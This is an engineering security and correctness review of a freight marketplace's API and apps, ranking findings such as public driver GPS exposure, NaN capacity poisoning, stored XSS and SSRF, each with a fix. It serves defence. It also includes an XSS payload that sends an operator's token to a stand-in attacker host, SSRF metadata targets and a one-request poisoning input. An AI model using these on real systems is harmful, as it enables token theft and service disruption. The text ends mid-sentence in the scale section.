# naviG8r improvement backlog

Findings from a full read of the repository, ranked by consequence.

**How to read this.** Every finding below was confirmed by opening the cited file. Each states
the defect, a concrete failure scenario, and a specific change. Nothing here is a style
preference — where something is a matter of taste it is marked as such and put at the bottom.

**This pass is documentation only — it changes no behaviour.** Several findings overlap with the
open draft PRs (#81–#106) that nobody has reviewed; those are noted inline.

Re-verified against commit `187fe76` (2026-09-13). Test suite: **60/60 passing** (54 API + 6 core)
on Node 24, run locally.

**What the 2026-09-13 re-verification changed.** Main advanced 16 commits and ~2,400 lines between
the first pass (`0fc4ad0`) and this one, adding GitHub Actions CI, a three-environment Render
promotion pipeline, and an ops soft-delete subsystem. Against that:

| | Findings |
|---|---|
| Fixed | **M5** (CI now runs the tests) |
| Partially fixed | **H4** (sessions are now revocable, but only by deactivating the account) |
| Newly introduced | **C5**, **C6**, **C7** — see below |
| Everything else | Still stands. Line-number citations were re-checked and corrected |

`services.ts` grew 1,936 to 2,277 lines and `httpServer.ts` 1,602 to 1,695, so every line citation
in the first pass had moved. They have all been re-read and re-cited against `187fe76`.

---

## Critical — money correctness and data loss

### C0. Every driver's live GPS position is readable by anyone, unauthenticated

**Reachable in production as configured**, along with C0b and C0d. C1 through C4 are latent,
waiting on a config switch.

*Scope of verification:* this is confirmed **in the source** — the route, the spread, and the
field are all cited below. I did **not** call the deployed API to confirm live coordinates are
actually being served, so whether any trip currently carries a `lastLiveLocation` is unchecked.
That only affects how many drivers are exposed today, not whether the endpoint exposes them.
Someone with access should run `curl -s https://navig8r.onrender.com/anchor-trips | grep -c
lastLiveLocation` before deciding how fast to move.

`httpServer.ts:1395-1398`:

```
if (method === "GET" && url.pathname === "/anchor-trips") {
  const trips = [...store.anchorTrips.values()].map((t) => tripWithCarrierDisplay(store, t));
  return json(res, 200, { trips });
}
```

`tripWithCarrierDisplay` (`services.ts:197`) is `{ ...trip, carrierDisplayName }` — it spreads
the **whole** `AnchorTrip`. And `AnchorTrip` carries `lastLiveLocation?: TripLiveLocation`
(`types.ts:152`), which is:

```
{ lat, lng, recordedAtUtcMs, accuracyM?, speedMps?, headingDeg? }
```

The route is not an oversight of the demo-surface gate — it is *deliberately* public.
`publicMarketplaceRouteAllowed` (`httpServer.ts:297`) allowlists it by name so the customer
marketplace keeps working in production.

**Failure scenario:** anyone on the internet polls `GET https://navig8r.onrender.com/anchor-trips`
on a loop and receives the real-time latitude, longitude, speed and heading of every driver on
the platform, with the carrier's name attached. No account, no token.

For a freight platform this is worse than an ordinary data leak. It is continuous physical
tracking of identifiable drivers and their cargo — a cargo-theft and driver-safety problem, not
only a privacy one.

The contrast makes it clear this is unintended: the *authenticated* tracking endpoint
`getShipmentTripTracking` (`services.ts:1190`) carefully scopes visibility to the customer who
booked the shipment and applies a 15-minute staleness rule before showing a position. All of
that care is bypassed by the public list route.

Matches **open draft PR #81** ("public trip GPS leak"), unreviewed since 7 August.

**Fix:** project the trip before returning it on any public route. The marketplace needs
`id`, `carrierId`, `carrierDisplayName`, `origin`, `destination`, window, `vehicleClass`,
`capacityKg`, `reservedKg` and `status` — and nothing else. Add a `publicTripView()` helper and
use it for both `GET /anchor-trips` and `GET /anchor-trips/:id`, so a future field added to
`AnchorTrip` is private by default rather than public by default.

### C0b. One malformed booking request permanently destroys an anchor trip

`httpServer.ts:1485` passes `weightKg: Number(body?.weightKg ?? 0)` straight into `bookShipment`.
Send `{"weightKg": "abc"}` — or any non-numeric value such as `{}` or `[1,2]` — and `Number()`
yields `NaN`. **Every guard downstream is a comparison, and every comparison against `NaN` is
false**, so nothing stops it:

| Guard | Location | With `NaN` |
|---|---|---|
| `if (params.weightKg <= 0) throw` | `services.ts:1552` | `NaN <= 0` is `false` — passes |
| `if (trip.reservedKg + weightKg > capacityKg) throw` | `services.ts:1553` | `NaN > n` is `false` — passes |
| `if (params.weightKg <= 0) throw` | `computeFreightGrossPaise`, `services.ts:1381` | passes; `Math.round(NaN * 500)` → `NaN` |

Then `services.ts:1580` runs `trip.reservedKg += NaN` and the trip is poisoned for good:

- `trip.reservedKg` is `NaN` permanently.
- The trip **disappears from the marketplace** — `customerEligibleAnchorTripsPhaseA`, `services.ts:1296`
  computes `capacityKg - reservedKg >= weightKg`, and `NaN >= n` is `false`.
- Every later booking passes the capacity guard too, since `NaN + n > capacity` is also `false`.
- The payment is created with `amountPaise: NaN`.
- **It cannot be repaired.** Both release paths use `Math.max(0, trip.reservedKg - s.weightKg)`
  (`:1678`, `:1792`), and `Math.max(0, NaN)` is `NaN`. There is no admin endpoint that sets
  `reservedKg` directly.

*Verified by running the comparisons in Node 24 against the guards as written; the guard lines
are quoted above from source.*

**Failure scenario:** one unauthenticated `POST /shipments/book` with a non-numeric `weightKg`
silently and permanently removes a carrier's trip from the marketplace. Loop over the trip list
from C0 and the entire marketplace goes dark. Recovery means hand-editing `store.json`.

This is the most cheaply exploitable finding in this document: no account, one request, permanent,
unrecoverable. Related to **open draft PR #84** ("capacity NaN poison").

**Fix:** validate at the edge. Reject the request unless
`Number.isFinite(weightKg) && weightKg > 0`, and change the internal guards from `<= 0` to
`!Number.isFinite(w) || w <= 0` so the domain layer is safe independently of its caller. The
same treatment is needed anywhere `Number(body?.…)` feeds arithmetic.

### C0c. The customer login flow cannot work with real OTP codes

`customer_flow.dart:378-384`. The verify handler calls `/v1/auth/otp/start` **again**, takes the
`challengeId` from that brand-new challenge, and submits it together with the code the user
typed — which came from the *previous* challenge:

```dart
final start = await api.post(".../v1/auth/otp/start", data: {"phone": phone});
final challengeId = start.data?["challengeId"] as String?;
final r = await api.post(".../v1/auth/otp/verify",
    data: {"phone": phone, "challengeId": challengeId, "code": _code.text.trim()});
```

Server-side, `pilotOtpVerify` compares the submitted code against **that new challenge's** code
(`auth.ts:135`). With real random codes the two can never match, so customer login always fails.

It works today only because `OTP_DEBUG=1` makes every challenge return the same fixed code
(`OTP_FIXED_CODE ?? "123456"`, `auth.ts:99`).

The driver flow has a milder version of the same shape. `DriverPhoneScreen` calls `otp/start`
and discards the challenge id (`driver_flow.dart:232`), then `_DriverOtpScreenState
.didChangeDependencies` calls `_resend()`, which calls `otp/start` a second time (`:300`).
`_verify()` then correctly uses the stored id — so driver login *works*, but **every sign-in
sends two SMS and only the second code is valid.** The first code to arrive is the one the user
will naturally type, and it fails.

**Why this matters more than it looks:** it means the login flows have only ever been exercised
with the fixed debug code. Integrating an SMS provider (H3) will *not* be enough on its own —
customer login will still fail, and driver login will bill two messages per attempt and confuse
the user. Fix these together or the pilot stalls twice.

**Fix:** carry the `challengeId` from the screen that started the challenge into the verify call.
Never call `otp/start` inside a verify handler. In the driver flow, stop discarding the id at
`:232` and drop the automatic `_resend()` in `didChangeDependencies`, leaving resend as an
explicit user action.

### C0d. Carriers and customers can bypass the ops release gate on live production routes

The intended settlement flow is three-party: driver submits POD (`BOOKED → PENDING_RELEASE`, no
money moves), then an **ops agent** calls `/ops/shipments/:id/release`, which captures the
customer's payment and accrues the carrier's ledger line. `submitDriverPod` (`services.ts:1686`)
respects this — it only sets `PENDING_RELEASE`.

The legacy route `POST /shipments/:id/pod` does not. It runs
`ensureRazorpayCapturedBeforePod` and then `markPodDelivered`, which **captures the payment,
writes the carrier's ledger line, and marks the shipment `DELIVERED`** in one call
(`httpServer.ts:1594-1624`).

Two things combine to make this reachable in production:

**1. The demo-surface gate never fires for it.** `requireLegacyDemoSurface` (`:317`) calls
`publicMarketplaceRouteAllowed` first and returns `true` immediately if it matches. That function
explicitly allowlists both routes (`:308-309`):

```
if (method === "POST" && segs.length === 3 && segs[0] === "shipments" && segs[2] === "pod") return true;
if (method === "POST" && segs.length === 3 && segs[0] === "shipments" && segs[2] === "fail-refund") return true;
```

So `ENABLE_LEGACY_DEMO_SURFACE` and `NODE_ENV=production` are both irrelevant here — the comment
above the function says these routes "stay available when NODE_ENV=production".

**2. The authorization check accepts the carrier and the customer, not just ops.** With a bearer
token present, the route allows the call when *any* of these hold:

```
const visible = opsAdmin
  || shipmentVisibleToCustomerUser(store, shipment, userId)
  || shipmentVisibleToCarrierPilot(store, shipment, userId);
```

**Failure scenario A — carrier self-settles.** While a shipment is still `BOOKED`, the carrier
calls `POST /shipments/:id/pod` with their own token. The customer's payment is captured, the
carrier's ledger line is written, and the shipment goes straight to `DELIVERED`. It never enters
`PENDING_RELEASE`, so no operator ever sees it. The carrier has charged the customer and booked
their own payout for freight nobody verified was delivered.

**Failure scenario B — customer self-refunds.** `POST /shipments/:id/fail-refund` has the same
open gate and allows the customer (`opsAdmin || shipmentVisibleToCustomerUser`). A customer can
refund their own completed shipment and mark the carrier as failed, with no operator involved.

The one thing that *is* handled: with no bearer token at all, both routes 401 in production.
Unauthenticated abuse is blocked; authenticated abuse by the two parties with the most financial
motive is not.

Note `markPodDelivered` refuses when the status is already `PENDING_RELEASE` (`:1660`), so this
only works *before* a driver submits POD normally — which is exactly when a carrier would use it.

Related to **open draft PR #82** ("DRIVER payout hijack, POD-before-start").

**Fix:** remove `/shipments/:id/pod` and `/shipments/:id/fail-refund` from
`publicMarketplaceRouteAllowed` — they are not marketplace routes and never should have been on
that list — and restrict both to `assertOpsAgent`. The pilot app already uses
`POST /shipments/:id/driver-pod` for the driver path, so nothing legitimate should break.

### C1. A queued RazorpayX payout is recorded as PAID and can never be corrected

`services.ts:2223-2241`. The payout batch maps RazorpayX statuses to three outcomes:
`processed`/`completed` → PAID, `rejected`/`cancelled`/`reversed` → FAILED (lines stay
`ACCRUED` to retry), **everything else → `PROCESSING`, and the ledger lines are marked `PAID`
anyway.** The code says so plainly:

```
// PROCESSING or PAID: mark lines PAID (queued/processing payouts are in-flight, not reversible here).
for (const l of lines) store.ledgerLines.set(l.id, { ...l, status: "PAID", paidAtUtcMs: now });
```

There is **no RazorpayX payout webhook handler anywhere** — `razorpayWebhook.ts` handles only
`payment.authorized`, `payment.captured` and `payment.failed`, all customer-side. And no code
path ever moves a `LedgerLine` from `PAID` back to `ACCRUED`.

**Failure scenario:** a payout is created with status `queued`. The ledger marks the carrier
paid. The bank later rejects it — wrong account, insufficient balance in the RazorpayX source
account. Nothing tells the system. The carrier is recorded as settled, has no money, and there
is no report that would surface the discrepancy.

**Not currently live** — production runs `PAYOUTS_MODE=BOOKKEEPING`. But this is precisely the
switch the roadmap intends to flip.

**Fix:** treat `PROCESSING` as not-yet-paid (add a `PENDING` ledger state, or leave lines
`ACCRUED` with the transfer recorded), and add a RazorpayX payout webhook to settle or revert.
Until then, a reconciliation query comparing `PayoutTransfer` records against RazorpayX is the
minimum.

### C2. `PERSISTENCE=DB` silently discards the entire ERP integration subsystem

The store holds 18 collections (`store.ts:24-41`). `persistenceDb.ts` handles 13. The five it
never touches are `integrationConnections`, `integrationApiKeys`, `integrationIdempotency`,
`integrationEvents` and `integrationWebhookDeliveries` — the whole ERP feature. `grep -c
integration apps/api/src/persistenceDb.ts` returns 0; the same grep on `persistence.ts` returns
25. There are no Prisma models for any of them.

**Failure scenario:** switch to Postgres, redeploy. Every partner's API key stops working,
every webhook subscription is gone, idempotency records vanish so replayed ERP loads
double-book, and the pending delivery outbox is lost. No error is raised.

**Not currently live** — `render.yaml` sets `DATA_FILE` and never sets `PERSISTENCE=DB`, so
production is on the file store and this data is durable there today. It is a landmine on the
path roadmap section A is walking toward.

**The gap is wider than five collections — the modelled ones lose fields too.** File-mode
persistence dumps whole objects (`persistence.ts:96`: `shipments: [...store.shipments.values()]`),
so every field survives automatically. `persistenceDb.ts` maps fields one by one against
`schema.prisma`, and `ShipmentRow` declares none of `externalLoadId`, `externalSource`,
`integrationConnectionId` or `metadata` — the entire ERP linkage on a shipment.

So even for the 13 collections that *are* modelled, a DB round-trip silently strips the ERP
identity from every shipment. Together with the missing `integrationIdempotency` collection, an
ERP that retries a load after a restart double-books and double-charges, with nothing left in the
system to recognise the duplicate.

One more shape mismatch in the same model: `weightKg` is declared `Int`, while the domain only
validates `weightKg > 0` and accepts fractional values (`services.ts:1552`). I did **not** test
which way that fails — Prisma may reject the write or coerce it — but the declared type and the
domain contract disagree, and that is worth resolving alongside M2 (which proposes integer grams).

**Fix:** add the five missing Prisma models and their load/save, add the missing `ShipmentRow`
columns, and add a round-trip test that saves a fully-populated store and asserts equality after
loading it back. That test is what would have caught all of this — see M5.

Until then, treat `PERSISTENCE=DB` as unsafe and fail startup loudly if it is set.

### C3. A redelivered `payment.captured` webhook can resurrect a refunded payment

`razorpayWebhook.ts:60-73`. The `payment.authorized` handler guards its source state
(`if (pay.status === "AUTHORIZED" || pay.status === "CAPTURED") return;`) and so does
`payment.failed` (`if (pay.status === "CAPTURED" || pay.status === "REFUNDED") return;`).
**`payment.captured` has no such guard** and writes `status: "CAPTURED"` unconditionally.

**Failure scenario:** a shipment fails, `failCarrierAndRefund` sets the payment to `REFUNDED`.
Razorpay redelivers the earlier `payment.captured` event — which it does on any non-2xx, and
ordering is not guaranteed. The payment flips back to `CAPTURED` while the shipment reads
`FAILED_CARRIER_REFUNDED`. The customer's money was returned; the ledger says it was taken.

**Fix:** one line, mirroring the siblings — `if (pay.status === "REFUNDED") return;`

### C4. Abandoned bookings permanently consume trip capacity

`services.ts:1580` reserves capacity the moment `bookShipment` runs — before the carrier
accepts and before payment is authorized. `reservedKg` is decremented in exactly two places:
`rollbackBooking` (`:1678`, only when Razorpay order creation fails) and `failCarrierAndRefund`
(`:1792`). There is no expiry, no timeout, and no sweeper for a shipment left in
`PENDING_CARRIER_ACCEPT`.

**Failure scenario:** a customer starts a booking and abandons checkout. The capacity is gone
for good. Repeat it and a trip reaches `FULL` with no paying customers — a carrier's truck runs
empty. Done deliberately with an unauthenticated `POST /shipments/book`, it is a denial of
service against every open trip on the marketplace.

**Fix:** expire `PENDING_CARRIER_ACCEPT` shipments whose payment is not `AUTHORIZED` within a
window (15 minutes is conventional for held inventory), releasing capacity. Add an ops endpoint
to release a specific booking manually in the meantime.

---

### C5. `NODE_ENV` is both an environment name and a security switch, and the new three-environment model made those meanings collide

Three separate production protections are keyed off `NODE_ENV !== "production"`:

| File:line | What it guards | Behaviour when `NODE_ENV` is not exactly `production` |
|---|---|---|
| `httpServer.ts:321` | The legacy demo surface | Enabled |
| `httpServer.ts:92` | CORS origin allowlist | Reflects **any** origin |
| `integrationServices.ts:98` | Partner webhook URL scheme | Plain `http://` accepted |

`render.yaml` now sets `NODE_ENV` to the **environment name**:

```yaml
- name: alpha        NODE_ENV: alpha       ENABLE_LEGACY_DEMO_SURFACE: "1"
- name: beta         NODE_ENV: beta        ENABLE_LEGACY_DEMO_SURFACE: "0"
- name: production   NODE_ENV: production  (key absent)
```

So on alpha **and beta**, all three protections are off. Beta's `ENABLE_LEGACY_DEMO_SURFACE: "0"` is
inert — line 321 short-circuits on the `NODE_ENV` test before it is ever read:

```ts
const enabled = process.env.NODE_ENV !== "production" || process.env.ENABLE_LEGACY_DEMO_SURFACE === "1";
```

What that opens on beta, all unauthenticated (verified by reading each handler):

| Route | `httpServer.ts` | Returns |
|---|---|---|
| `GET /v1/users` | 896 | `[...store.users.values()]` — every user and phone number |
| `GET /v1/orgs` | 890 | Every organisation |
| `GET /admin` | 902 | An HTML page rendering users, memberships, vehicles, trips, shipments, payments and ledger lines |
| `POST /carriers`, `POST /anchor-trips` | 1355, 1369 | Legacy CRUD — publish capacity as any carrier |
| `POST /v1/pilot/driver/login` | 553 | Legacy driver login with no OTP |

Beta is the UAT environment. It runs `PAYMENT_PROVIDER=RAZORPAY` against real Razorpay test
credentials, and it is the environment real pilot users get pointed at.

**Failure scenario:** a shipper does UAT on beta. `curl https://navig8r-api-beta.onrender.com/v1/users`
returns every pilot user's name and mobile number to anyone who guesses the hostname. Nobody notices,
because the blueprint says `ENABLE_LEGACY_DEMO_SURFACE: "0"` and that reads as switched off.

The `Dockerfile` bakes `ENV NODE_ENV=production` (line 7), so the **image** is safe by default and the
**blueprint** is what opens it. That is the wrong way round: a config mistake should fail closed.

**Fix — do not widen the `NODE_ENV` test.** Separate the two meanings:

```ts
// One explicit switch per protection, default-deny. NODE_ENV stays a label.
const demoSurfaceEnabled = process.env.ENABLE_LEGACY_DEMO_SURFACE === "1";
```

Then set `ENABLE_LEGACY_DEMO_SURFACE: "1"` on alpha only, and give CORS and the webhook-scheme check
their own named variables. Deleting the legacy routes outright is better still — see R3.

Draft PR **#104** ("Honor ENABLE_LEGACY_DEMO_SURFACE=0 on beta") fixes the demo-surface third of this.
It does not touch CORS or the webhook scheme check, both of which are open on beta for the same reason.

### C6. Ops soft-delete does not reach the marketplace: tombstoned trips are still listed and bookable

`opsDeleteUser` cascades a tombstone across organisations, shipments, payments, trips, ledger lines,
vehicles and driver profiles (`services.ts:619` onward). It is careful work. But `isActiveEntity` is
called in only three places outside the deletion path itself:

```
auth.ts:93, 127, 165     login and session verification
services.ts:353, 389     customer shipment visibility
```

It is called **nowhere** in listing, quoting, or booking. Verified:

```ts
// httpServer.ts:1396 — the public marketplace listing, no filter of any kind
const trips = [...store.anchorTrips.values()].map((t) => tripWithCarrierDisplay(store, t));

// services.ts:1319 — the matching loop, status is the only filter
for (const trip of store.anchorTrips.values()) {
  if (trip.status !== "OPEN") continue;
```

`markInactive` sets `inactiveAtUtcMs`; it does not change `status`. A tombstoned trip that was `OPEN`
stays `OPEN`.

**Failure scenario:** ops deactivates a carrier for fraud. Every one of that carrier's open anchor
trips stays on the public marketplace. A customer books one, is charged, and the money is authorized
against a carrier who can no longer log in — `auth.ts:93` rejects them at `otp/start`. The load has no
driver and no one finds out until the pickup window passes.

**Fix:** filter at the two read paths above, not at every call site. Then add a test that deactivates a
carrier and asserts its trips leave `GET /anchor-trips`.

Draft PR **#106** ("Stop booking and listing ops-tombstoned marketplace trips") reports this. **It is
correct** — I checked both code paths against its claim.

Related: the public listing also spreads the whole trip object, so it now publicly discloses
`inactiveAtUtcMs` and `inactiveReason: "ops_user_deactivate"` — that an account was deactivated by ops,
and when. See C0.

### C7. The containerised customer-web silently loses the Maps API key, breaking address entry

Two different mechanisms carry `MAPS_API_KEY` into the Flutter web app, and the new container build
uses only one of them.

| Consumer | How it gets the key | Container build |
|---|---|---|
| Google Maps JS `<script>` in `web/index.html:24` | `__MAPS_API_KEY__` placeholder, `sed`-replaced at container start by `docker/customer-web/entrypoint.sh:12` | Works |
| Dart `kMapsApiKey` (`maps_config.dart:7`) | `String.fromEnvironment("MAPS_API_KEY")` — resolved at **compile** time | **Empty string** |

`Dockerfile.customer-web:31-33` builds with one define:

```dockerfile
RUN flutter pub get \
    && flutter build web --release \
       --dart-define=API_BASE_URL=/api
```

The existing static Render build does pass it (`scripts/render-build-customer-web.sh:44-48`):

```bash
DART_DEFINES=(--dart-define="API_BASE_URL=$API_BASE_URL")
if [ -n "$MAPS_API_KEY" ]; then
  DART_DEFINES+=(--dart-define="MAPS_API_KEY=$MAPS_API_KEY")
fi
```

So this is a **regression that arrives at cutover**, not a bug that is live today. `render.yaml` names
`navig8r-customer-web-image` as the production migration target; the day that replaces the static
service, Dart-side geocoding stops.

And it stops **silently**, because both call sites early-return on an empty key:

```dart
// location_editor.dart:413 and driver_flow.dart:1609
if (kMapsApiKey.isEmpty) return;
```

**Failure scenario:** the cutover happens. Map tiles still render, because the script tag got its key
from the entrypoint. Address autocomplete and reverse geocoding do nothing at all — no error, no
console warning, no fallback. A customer cannot enter a pickup address, so no one can book. It looks
like a UI bug rather than a build-arg omission, which is the expensive kind.

**Fix:** add the build arg to `Dockerfile.customer-web`:

```dockerfile
ARG MAPS_API_KEY=""
RUN flutter build web --release \
      --dart-define=API_BASE_URL=/api \
      --dart-define=MAPS_API_KEY="${MAPS_API_KEY}"
```

then pass it from `release.yml`. Note this bakes the key into the image, which the runtime-`sed`
approach deliberately avoided — so the better fix is to stop reading the key from a compile-time
constant and read it from `release.json` (which the entrypoint already writes) or from a `<meta>` tag
the entrypoint fills, keeping one runtime injection point for both consumers.

Either way, **replace the two silent `return`s with a visible error**. A missing key should be loud.

Draft PR **#97** ("Clarify MAPS_API_KEY APK build + customer GPS root causes") is adjacent but is about
the APK build, not the container.

## High — security

### H1. `ALLOW_X_USER_ID` is an unauthenticated impersonation switch with no production guard

`httpServer.ts:285-292`. When `ALLOW_X_USER_ID=1`, `requireUserId` returns the `x-user-id`
header directly — no signature, no session lookup, no expiry check — before it ever considers
the bearer token. It fronts roughly 20 authenticated routes.

The sharp edge is an inconsistency right next to it. There are **two** identity helpers:

| Helper | Honors the bypass? | Used by |
|---|---|---|
| `requireBearerUserId` (`:326`) | No — goes straight to `verifyBearer` | `/ops/shipments/*`, `/ops/.../release` |
| `requireUserId` (`:283`) | **Yes** | `POST /payout-batches/run`, `GET /payout-batches`, and the pilot routes |

So the ops *release* endpoints are protected from the bypass, but `POST /payout-batches/run` —
the endpoint that moves real money under `PAYOUTS_MODE=RAZORPAYX` — is not.

Unlike the legacy demo surface beside it, this flag is **not** gated on `NODE_ENV`. It is off by
default and absent from `render.yaml`, so it is not currently live.

**Fix:** gate it on `NODE_ENV !== "production"` at minimum. Better: delete it and use a seeded
test token in tests. Then collapse the two helpers into one so the safe behaviour is the only
behaviour.

### H2. Stored XSS in the ops portal via customer organization name

`httpServer.ts:233`, `:247` and `:1231`. The ops portal builds its tables by string concatenation into
`innerHTML` with no escaping:

```
return "<tr><td><code>" + s.id + "</code></td><td>" + (s.customerOrgName||"") + ...
```

`customerOrgName` is supplied by the customer at booking. The `/admin` route defines a local
`esc()` helper (`:861-866`); the ops portal defines nothing.

**Failure scenario:** a customer registers an org named
`<img src=x onerror="fetch('//attacker/'+localStorage.access_token)">`. An operator opens
`/ops`, and the operator's bearer token — which carries ops-admin rights, including payout
authority — is exfiltrated. This is privilege escalation from customer to operator.

The `/ops` *data* endpoints are correctly protected (`requireBearerUserId` plus
`assertOpsAgent`), so this is not an open data leak; the payload fires in an authenticated
operator's browser. `/ops` does serve its HTML shell unauthenticated in production, unlike
`/admin`.

Already found by **open draft PR #87**, which nobody has reviewed.

**Fix:** use `textContent` and DOM construction, or hoist the existing `esc()` to module scope
and apply it to every interpolated field.

### H3. No OTP rate limiting, and no SMS delivery at all

`auth.ts`. `pilotOtpVerify` compares the submitted code and throws on mismatch, leaving the
challenge `PENDING`. There is no attempt counter, no lockout, and no per-phone throttle on
`pilotOtpStart`. The only rate limiting anywhere in the codebase is webhook retry backoff.

A six-digit code with a ten-minute window and unlimited attempts is brute-forceable.

Compounding this, no SMS provider is integrated. `types.ts:91` says so: *"Pilot OTP challenge
(mock SMS). Replace with real SMS + rate limits in production."* With `OTP_DEBUG=0`, which
`render.yaml` sets, codes are generated and never delivered — nobody can log in. With
`OTP_DEBUG=1`, `/v1/auth/otp/start` returns the code to any unauthenticated caller who knows a
phone number, which is account takeover by design.

**This is the single thing blocking a real pilot.** Neither setting supports onboarding a user.

**Fix:** integrate an Indian SMS provider (MSG91, Kaleyra and Gupshup are the usual choices for
DLT-registered transactional SMS), add a failed-attempt counter that expires the challenge after
5 tries, and throttle `otp/start` per phone.

### H4. Sessions are revocable only by deactivating the whole account, and there is still no logout

**Changed since the first pass.** The first pass said nothing ever sets `revokedAtUtcMs`. That is no
longer true — the ops soft-delete added the one and only writer (`services.ts:714`):

```ts
// Revoke sessions (cannot sign in); expire pending OTPs
for (const s of store.authSessions.values()) {
  if (s.userId === userId && s.revokedAtUtcMs == null) {
    store.authSessions.set(s.id, { ...s, revokedAtUtcMs: at });
  }
}
```

`grep -rn revokedAtUtcMs apps/api/src` confirms it is the only assignment outside the type
definition, the `null` initialiser at `auth.ts:148`, the check at `auth.ts:161`, and the two Prisma
serialisers. Belt and braces: `verifyBearer` also now rejects a session whose user is tombstoned
(`auth.ts:165`), so revocation holds even if a session row were missed.

So the mechanism works, and there is now exactly one way to trigger it: **an ops admin deactivating
the entire account**. What is still missing:

- No `POST /v1/auth/logout`. A user cannot end their own session, on any client.
- No way to revoke one session. Signing a driver out of a stolen phone means deactivating their
  account, which also tombstones their sole-owned org, its vehicles, trips, shipments and ledger
  lines (`services.ts:619`). That is not a sign-out, it is an offboarding.
- No way to reverse it. There is no `opsRestoreUser`; `markInactive` has no inverse in
  `softDelete.ts`. Deactivation is a one-way door through the API — recovery means editing
  `store.json` by hand.

**Failure scenario:** a driver's phone is stolen mid-shift. Ops has two options: leave the token
valid for its full 30-day lifetime, or deactivate the driver — which cancels their in-flight loads
and cannot be undone without hand-editing the store file.

**Fix:** `POST /v1/auth/logout` setting `revokedAtUtcMs` on the calling session, and
`DELETE /v1/ops/users/:id/sessions` to revoke all of a user's sessions without touching their data.
Both are small — the storage and the check already exist. Separately, add `opsRestoreUser` so
deactivation is reversible.

### H5. No SSRF protection on partner webhook URLs

`integrationServices.ts:96-101` validates a webhook URL only by requiring an `https://` prefix,
and only when `NODE_ENV === "production"`. There is no private-address check anywhere.
`integrationWebhooks.ts:253` then `fetch`es it from inside the API process.

**Failure scenario:** a customer with portal access sets their webhook to
`https://169.254.169.254/latest/meta-data/` or an internal `10.x` address. The API fetches it
and records the response status and up to 500 characters of the body in the delivery log, which
the customer can read back through the portal.

**Fix:** resolve the hostname and reject private, loopback, link-local and metadata ranges
before the first delivery and again at fetch time.

### H6. Webhook signatures have no timestamp, so deliveries can be replayed forever

`integrationAuth.ts:91` signs the payload body alone into `x-navig8r-signature`. Nothing binds
the signature to a moment in time and there is no nonce.

**Failure scenario:** a partner logs a delivery, or it is captured in transit at their edge.
The signed request stays valid indefinitely and can be replayed into the partner's endpoint to
duplicate a `load.delivered` event.

**Fix:** follow the Stripe and Svix convention — sign `${timestamp}.${body}`, send the timestamp
in the header, and document that receivers must reject timestamps outside a tolerance window.
This is a breaking change to the partner contract, so do it before the first real ERP partner
rather than after.

### H7. Anonymous shipments are visible to anyone who registers a matching organization name

`services.ts:311-316`. Shipment ownership falls back to a **free-text name comparison** when no
org id is set:

```
export function shipmentBelongsToCustomerOrg(shipment: Shipment, org: Organization): boolean {
  if (shipment.customerOrgId != null && shipment.customerOrgId !== "") {
    return shipment.customerOrgId === org.id;
  }
  return shipment.customerOrgName === org.displayName;
}
```

`customerOrgName` is a string the booker types at `POST /shipments/book`. `customerOrgId` is set
only when the booking carried a valid bearer token, so every anonymous booking is matched by
name alone.

Nothing prevents duplicate organization names. `registerCustomerOrgAdmin` (`:500`) rejects a
duplicate *phone* but never checks `displayName`, and `schema.prisma` declares no `@unique` on
it.

**Failure scenario:** an attacker registers a customer org with `displayName` set to a target
company's exact name. `GET /shipments` then returns that company's anonymous bookings —
pickup and drop addresses, weights, prices, and live tracking.

**This compounds with M1.** A real customer whose 30-day session has lapsed books "anonymously"
without being told, so their shipment is tagged by name only and becomes readable by anyone who
claims that name.

**Fix:** drop the name fallback and match on `customerOrgId` alone. For genuinely anonymous
bookings the phone linkage (`bookedByPhone`, already present and verified by OTP) is the correct
mechanism. Add a uniqueness constraint on customer org display names regardless.

### H8. Carriers can read every other carrier's settlement amounts

`services.ts:1120-1128`. `pilotListCarrierPayoutBatches` authorizes the caller for the requested
org correctly (`assertPilotDriverCanManageOrg`) and correctly selects the batches containing that
carrier's ledger lines. Then it returns the **entire `PayoutBatch` object**.

A `PayoutBatch` carries `transfers[]`, and `runPayoutBatch` pushes one entry per carrier in the
batch with `carrierId`, `netToCarrierPaise` and `providerPayoutId` — plus a batch-wide
`totalNetToCarrierPaise`.

**Failure scenario:** a carrier opens the payout history screen in the driver app. The response
contains what every other carrier in that weekly batch was paid. In a marketplace where carriers
compete for the same lanes, that is commercially sensitive information about rivals' volumes and
rates.

Already found by **open draft PR #98**, which nobody has reviewed.

**Fix:** project the batch before returning it — keep `id`, `cutoffUtcMs`, `createdAtUtcMs` and
the caller's own transfer and line ids, and drop everyone else's.

---

## High — scale and availability

### S1. In DB mode, every write deletes and re-inserts the entire database

`persistenceDb.ts:315-330`. `saveStoreToDatabase` opens one interactive transaction, calls
`deleteMany()` on all 13 tables, then re-creates every row with individual `create()` calls.
`persist()` runs after every mutating request.

**Failure scenario:** at 1,000 shipments, a single booking deletes and rewrites every user,
membership, trip, shipment, payment and ledger line. Latency scales with total data, not with
the change. Concurrent requests serialise on the transaction, and any failure rolls back the
whole store.

This is the mode roadmap section A is moving toward, so it will be hit.

**Fix:** write only what changed. The store already knows which entity a handler touched, so
targeted `upsert` calls are a mechanical change from here.

### S2. The payout runner writes an empty batch row every 60 seconds, forever

`services.ts:2160-2177` creates and stores a `PayoutBatch` even when nothing is eligible —
deliberately, per the comment *"Still create an empty batch for determinism in MVP."* The
background timer (`index.ts:27`) calls it every 60 seconds.

That is 1,440 rows per day and roughly 526,000 per year. The timer skips `persist()` when the
batch is empty, but the next unrelated write flushes them all to disk, and file-mode persistence
re-serialises the entire store on every write.

**Failure scenario:** after a few months of quiet running, `store.json` is dominated by empty
payout batches and every booking pays to re-serialise them.

**This is no longer a prediction — it is measured.** Open PR **#101** reports **21,832** of these
rows already in live production, with `GET /admin` returning roughly **7 MB** that is almost
entirely this list. (Those figures are from that PR, not something I measured myself.) The
event-loop cost of re-serialising them is being paid on every OTP, booking and GPS ping today.

**Fix:** return the empty batch without storing it, or store it only when `lineIds.length > 0`.
The determinism the comment wants is satisfied by the return value.

### S3. Nothing prunes OTP challenges, sessions, or integration events

OTP challenges are status-flipped to `CONSUMED` or `EXPIRED` and never deleted, with the code
stored in plaintext. Auth sessions accumulate for 30 days each and are never removed. Integration
events and webhook deliveries have no retention policy.

Combined with S2 and the full-store serialize, the store only grows.

**Fix:** a sweeper that deletes consumed and expired OTP challenges, sessions past expiry, and
integration events older than a retention window.

### S4. The API cannot be scaled horizontally as written

`index.ts:27` and `:45` start two `setInterval` loops in-process, neither with a re-entrancy
guard. Both mutate shared state.

Two problems, either of which is enough:

